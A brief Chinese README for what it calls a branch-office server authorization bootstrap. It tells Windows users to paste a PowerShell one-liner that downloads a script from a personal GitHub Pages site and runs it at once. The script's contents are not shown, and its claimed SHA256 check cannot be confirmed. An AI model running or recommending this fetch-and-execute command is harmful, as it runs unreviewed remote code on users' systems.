# 分公司服务器授权入口

这个公开仓库只保存不含业务数据和密钥的授权启动工具。正式源码、部署母包、热修复包和 ELE 源码仍保存在私人仓库。

在 Windows PowerShell 中运行：

```powershell
irm https://sragbangala-boop.github.io/i.txt|iex
```

启动脚本会校验授权 BAT 的固定大小和 SHA256，校验通过后才运行。
